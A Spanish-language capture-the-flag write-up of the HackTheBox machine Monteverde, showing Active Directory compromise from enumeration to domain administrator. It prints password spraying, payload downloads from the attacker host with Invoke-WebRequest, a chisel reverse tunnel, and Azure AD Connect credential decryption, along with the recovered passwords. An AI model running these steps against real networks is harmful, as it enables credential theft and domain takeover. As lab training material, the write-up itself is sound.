Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #azure-connect #azure #adsync #password-spraying #mssql

![](assets/Pasted%20image%2020260128113006.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.228.111
PING 10.129.228.111 (10.129.228.111) 56(84) bytes of data.
64 bytes from 10.129.228.111: icmp_seq=1 ttl=127 time=111 ms

--- 10.129.228.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 110.837/110.837/110.837/0.000 ms
```


Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.228.111 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 -sV -sC -Pn -n -sS -vvv 10.129.228.111 -oN nmap/target


PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-28 17:50:39Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-28T17:51:44
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59714/tcp): CLEAN (Timeout)
|   Check 2 (port 10226/tcp): CLEAN (Timeout)
|   Check 3 (port 29693/udp): CLEAN (Timeout)
|   Check 4 (port 18365/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 1s
```

Por la información que tengo puedo intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 636 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB.

Saque información general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb 10.129.228.111
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

- Dominio **megabank.local** y nombre de la maquina **MONTEVERDE**

Voy a colocarlo en el `/etc/hosts`:

```bash
10.129.228.111 MONTEVERDE  MONTEVERDE.MEGABANK.LOCAL MEGABANK.LOCAL
```

Intente enumerar los shares pero no tuve éxito:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb megabank.local -u 'guest' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED

┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb megabank.local -u '' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\:
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### Puerto 135 RPC

Intente conectarme por RPC utilizando una null session y tuve éxito

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ rpcclient -U '' -N megabank.local
rpcclient $
```

Desde aqui puedo tratar de enumerar usuarios:

```bash
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

Voy a guardar estos usuarios en un diccionario:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ \cat users.txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```


## Acceso Inicial.

Con una lista de usuarios validos puedo tratar de realizar un ataque AS-REP Roasting pero no tuve exito:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ impacket-GetNPUsers megabank.local/ -no-pass -usersfile users.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Puedo probar los usuarios como user / password para ver si algún usuario tiene de contraseña su propio nombre.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb megabank.local -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE
```

- El [+] en SABatchJobs indica que este usuario es valido.

Ahora que tengo credenciales puedo enumerar los shares a los que tengo acceso:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb megabank.local -u SABatchJobs -p SABatchJobs --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       users$          READ
```

- Tengo permisos de lectura en los recursos azure_uploads y users.

Al conectarme al recurso `users$` me encontré el archivo llamado `azure.xml` en el directorio **mhope**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ smbclient //10.129.228.111/users$ -U 'SABatchJobs%SABatchJobs'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 13:12:48 2020
  ..                                  D        0  Fri Jan  3 13:12:48 2020
  dgalanos                            D        0  Fri Jan  3 13:12:30 2020
  mhope                               D        0  Fri Jan  3 13:41:18 2020
  roleary                             D        0  Fri Jan  3 13:10:30 2020
  smorgan                             D        0  Fri Jan  3 13:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> cd dgalanos
smb: \dgalanos\> ls
  .                                   D        0  Fri Jan  3 13:12:30 2020
  ..                                  D        0  Fri Jan  3 13:12:30 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \dgalanos\> cd ..
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 13:41:18 2020
  ..                                  D        0  Fri Jan  3 13:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

- mhope es uno de los usuarios que encontramos vía RPC.

El archivo contenía una contraseña `4n0therD4y@n0th3r$` :

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ \cat content/azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Probé las credenciales para distintos servicios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc smb megabank.local -u mhope -p '4n0therD4y@n0th3r$'
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$

┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc winrm megabank.local -u mhope -p '4n0therD4y@n0th3r$'
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

- Son validas para SMB y WinRm.

## Escalada de Privilegios.

Me conecte y consigo la primera flag.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ evil-winrm-py -i 10.129.228.111 -u mhope -p 4n0therD4y@n0th3r$
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.228.111:5985' as 'mhope'
evil-winrm-py PS C:\Users\mhope\Documents> whoami
megabank\mhope
evil-winrm-py PS C:\Users\mhope\Desktop> type user.txt
c79100505dd834f****
```

En tema de groups pertenezco a un grupo llamado Azure Admins.

```bash
evil-winrm-py PS C:\Users\mhope\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
```

Utilice Winpeas para detectar posibles vectores de escalada de privilegios.

```bash
evil-winrm-py PS C:\Temp> Invoke-WebRequest -Uri http://10.10.16.57/winPEASx64.exe -Outfile winpeas.exe
evil-winrm-py PS C:\Temp> ls


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2026  10:20 AM       10170880 winpeas.exe


evil-winrm-py PS C:\Temp> .\winpeas.exe
```

Encontré el servicio MSSQL corriendo por el puerto 1433

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               88            0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         892             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         892             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3636            sqlservr
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2860            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         468             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1128            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1632            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49674         0.0.0.0               0               Listening         620             lsass
  TCP        0.0.0.0               49676         0.0.0.0               0               Listening         2492            spoolsv
  TCP        0.0.0.0               49680         0.0.0.0               0               Listening         608             services
  TCP        0.0.0.0               49696         0.0.0.0               0               Listening         1336            dns
  TCP        0.0.0.0               49750         0.0.0.0               0               Listening         2444            dfsrs
  TCP        10.129.228.111        53            0.0.0.0               0               Listening         1336            dns
  TCP        10.129.228.111        135           10.129.228.111        59898           Established       892             svchost
  TCP        10.129.228.111        139           0.0.0.0               0               Listening         4               System
  TCP        10.129.228.111        1433          10.129.228.111        49712           Established       3636            sqlservr
  TCP        10.129.228.111        1433          10.129.228.111        49713           Established       3636            sqlservr
  TCP        10.129.228.111        1433          10.129.228.111        49714           Established       3636            sqlservr
  TCP        10.129.228.111        1433          10.129.228.111        49715           Established       3636            sqlservr
  TCP        10.129.228.111        1433          10.129.228.111        49716           Established       3636            sqlservr
  TCP        10.129.228.111        5985          10.10.16.57           52188           Established       4               System
  TCP        10.129.228.111        49667         10.129.228.111        59899           Established       620             lsass
  TCP        10.129.228.111        49712         10.129.228.111        1433            Established       504             miiserver
  TCP        10.129.228.111        49713         10.129.228.111        1433            Established       504             miiserver
  TCP        10.129.228.111        49714         10.129.228.111        1433            Established       504             miiserver
  TCP        10.129.228.111        49715         10.129.228.111        1433            Established       504             miiserver
  TCP        10.129.228.111        49716         10.129.228.111        1433            Established       504             miiserver
  TCP        10.129.228.111        59898         10.129.228.111        135             Established       504             miiserver
  TCP        10.129.228.111        59899         10.129.228.111        49667           Established       504             miiserver
  TCP        127.0.0.1             53            0.0.0.0               0               Listening         1336            dns
  TCP        127.0.0.1             1434          0.0.0.0               0               Listening         3636            sqlservr
```

También encontré un directorio llamado `.azure` en

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
    Accessed:1/3/2020 5:36:14 AM -- Size:7896

    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
    Accessed:1/3/2020 5:35:57 AM -- Size:2794
```

Podría interactuar con MSSQL desde la shell de windows pero yo prefiero utilizar chisel para tener acceso desde mi maquina host:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ chisel server -p 9000 --reverse
```

Y  en la maquina victima:

```bash
evil-winrm-py PS C:\Temp> .\chisel.exe client 10.10.16.57:9000 R:1433:localhost:1433
```

Ahora que tengo acceso desde mi maquina host puedo probar si mis credenciales son validas:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ nxc mssql 127.0.0.1 -u mhope -p '4n0therD4y@n0th3r$'
MSSQL       127.0.0.1       1433   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
MSSQL       127.0.0.1       1433   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

- El [+] indica que mis credenciales son validas.

Me voy a conectar a la base de datos para enumerarla:

```bash
──(wndr㉿wndr)-[~/Machines/hackthebox/montverde]
└─$ impacket-mssqlclient MEGABANK.LOCAL/mhope:'4n0therD4y@n0th3r$'@127.0.0.1 -windows-auth

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MONTEVERDE): Line 1: Changed database context to 'master'.
[*] INFO(MONTEVERDE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017  (14.0.2027)
[!] Press help for extra shell commands
SQL (MEGABANK\mhope  guest@master)> select name from sys.databases;

name
------
master
tempdb
model
msdb
ADSync
```

La tabla ADSync es un componente utilizado por Azure Connect para sincronizar configuraciones entre DCS.

- Azure Connect es un servicio de Microsoft que sincroniza identidades entre un AD On premise y un Azure Active Directory. En este caso encontramos una base de datos correspondiente a la configuración de sincronización entre estos dos, en esta base de datos deberíamos poder encontrar credenciales necesarias para la sincronizacion.

```bash
QL (MEGABANK\mhope  MEGABANK\mhope@ADSync)> select table_name from ADSync.information_schema.tables;
table_name
-------------------------
mms_metaverse
mms_metaverse_lineageguid
mms_metaverse_lineagedate
mms_connectorspace
mms_cs_object_log
mms_cs_link
mms_management_agent
mms_synchronization_rule
mms_csmv_link
mms_metaverse_multivalue
mms_mv_link
mms_partition
mms_watermark_history
mms_run_history
mms_run_profile
mms_server_configuration
mms_step_history
mms_step_object_details
```

- Cada tabla en realidad es un XML algo raro.

En mi caso voy a utilizar el siguiente [PoC](https://github.com/VbScrub/AdSyncDecrypt) para dumpear las credenciales.

- Desde la maquina windows me voy a descargar los archivos necesarios.

```bash
evil-winrm-py PS C:\Temp> Invoke-WebRequest -Uri http://10.10.16.57/AdDecrypt.exe -Outfile AdDecrypt.exe
evil-winrm-py PS C:\Temp> Invoke-WebRequest -Uri http://10.10.16.57/mcrypt.dll -Outfile mcrypt.dll
```

Y después se nos indica que el script debe de ser ejecutado en la ruta de Azure Connect.

```bash
evil-winrm-py PS C:\> cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
```

Desde este directorio voy a ejecutar el PoC:

```bash
evil-winrm-py PS C:\Program Files\Microsoft Azure AD Sync\Bin> c:\Temp\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

- Obtuvimos las credenciales para administrator.

Ahora puedo conectarme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Tools/AdDecrypt]
└─$ evil-winrm-py -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.228.111:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```

***PWNED***

